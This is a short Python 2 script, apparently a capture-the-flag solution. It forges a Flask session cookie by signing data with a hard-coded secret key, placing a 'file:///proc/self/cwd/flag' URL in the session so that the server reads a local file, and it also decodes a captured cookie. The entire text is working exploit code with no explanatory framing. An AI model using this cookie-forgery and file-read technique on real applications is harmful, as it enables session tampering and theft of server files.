def decode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    print s.dumps({u'url': u'file:///proc/self/cwd/flag'})
    return s.loads(cookie_str)
print decode_flask_cookie("v3ry_v3ry_s3cr37_k3y","eyJ1cmwiOiJodHRwOi8vMTIxLjE1OS43NS4zOCJ9.DHtA7g.dcZQdp_3RVkC8I3744CLV4uuEQQ")
